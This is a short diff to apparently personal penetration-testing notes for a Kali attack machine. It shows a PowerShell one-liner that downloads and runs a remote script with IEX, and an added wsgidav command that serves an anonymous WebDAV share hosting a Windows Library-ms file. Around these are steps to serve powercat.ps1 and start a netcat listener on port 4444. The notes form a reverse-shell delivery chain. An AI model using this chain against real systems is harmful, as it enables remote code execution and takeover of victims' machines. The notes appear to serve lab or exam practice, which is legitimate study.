@@ -27,9 +27,10 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 ==============================================
 @KALI
 ==============================================
-Save config.Library-ms and install to webdav path.
-Serve at port 8000 powercat.ps1
-Start nc at 4444
+# Save config.Library-ms and install to webdav path.
+/home/user/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/user/webdav
+# Serve at port 8000 powercat.ps1
+# Start nc at 4444
 ==============================================
 
 # Create a file body.txt with content.
